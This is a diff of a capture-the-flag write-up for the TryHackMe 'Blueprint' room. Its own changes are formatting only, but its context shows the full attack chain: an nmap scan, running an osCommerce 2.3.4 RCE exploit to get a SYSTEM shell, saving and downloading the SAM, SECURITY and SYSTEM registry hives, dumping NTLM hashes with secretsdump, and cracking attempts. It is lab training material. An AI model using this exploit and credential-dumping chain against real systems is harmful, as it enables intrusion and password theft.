@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Windows
 Subscription type: Free
 Description: Hack into this Windows machine and escalate your privileges to Administrator.
 ```
+
 Room link: [https://tryhackme.com/r/room/blueprint](https://tryhackme.com/r/room/blueprint)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/blueprint](https://tryhackme.com/r/room
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ nmap -v -sV -sC 10.10.241.145
@@ -153,11 +157,13 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 71.20 seconds
 ```
+
 We can see from the output above that the server is running [OsCommerce](https://en.wikipedia.org/wiki/OsCommerce) version 2.3.4.
 
 ### Check for exploits
 
 Let's check if there is an exploit available for that version.
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ searchsploit oscommerce 2.3.4 
@@ -201,6 +207,7 @@ We found 2 possible RCE exploits written in Python.
 ### Analyse the exploits
 
 Now we check/analyse the exploits
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ head -n 25 44374.py
@@ -263,7 +270,8 @@ def rce(command):
 ### Get a reverse shell
 
 Let's go for the later one which accepts the URL via parameters.
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ python 50128.py http://10.10.241.145:8080/oscommerce-2.3.4/catalog/
 [*] Install directory still available, the host likely vulnerable to the exploit.
@@ -289,13 +297,15 @@ RCE_SHELL$ dir
 
 RCE_SHELL$ 
 ```
+
 We are running as `SYSTEM` and are located in the `C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes` directory.
 
 ### Get the registry hives
 
 To crack the NTLM hash of the `Lab` user we need the `SAM`, `SECURITY`, and `SYSTEM` registry hives.  
 We can get them with `reg.exe save`
-```
+
+```text
 RCE_SHELL$ reg.exe save hklm\sam SAM
 The operation completed successfully.
 
@@ -307,6 +317,7 @@ The operation completed successfully.
 ```
 
 Next, we download them with `wget`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ wget http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SAM
@@ -350,6 +361,7 @@ SYSTEM                                         100%[============================
 ### Dump the hashes
 
 Now we dump the hashes with secretsdump from `impacket`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ impacket-secretsdump LOCAL -sam SAM -security SECURITY -system SYSTEM
@@ -369,9 +381,11 @@ dpapi_machinekey:0x9bd2f17b538da4076bf2ecff91dddfa93598c280
 dpapi_userkey:0x251de677564f950bb643b8d7fdfafec784a730d1
 [*] Cleaning up... 
 ```
+
 The NTLM hash for `Lab` is `30e87bf999828446a1c1209ddde4c450`.
 
 Let's try to crack it with `hashcat` and the rockyou wordlist
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
 └─$ hashcat -a 0 -m 1000 '30e87bf999828446a1c1209ddde4c450' /usr/share/wordlists/rockyou.txt
@@ -403,6 +417,7 @@ Hardware.Mon.#1..: Util: 19%
 Started: Wed Sep 25 20:54:24 2024
 Stopped: Wed Sep 25 20:54:43 2024
 ```
+
 Nope, that didn't work.
 
 We can check [crackstation.net](https://crackstation.net/) instead and see if the hash is already cracked.  
@@ -411,6 +426,7 @@ And it is! The password is `g<REDACTED>s`
 ### Get the root flag
 
 Finally, we get the root flag from our reverse shell
+
 ```bash
 RCE_SHELL$ where /R C:\Users root.txt 
 
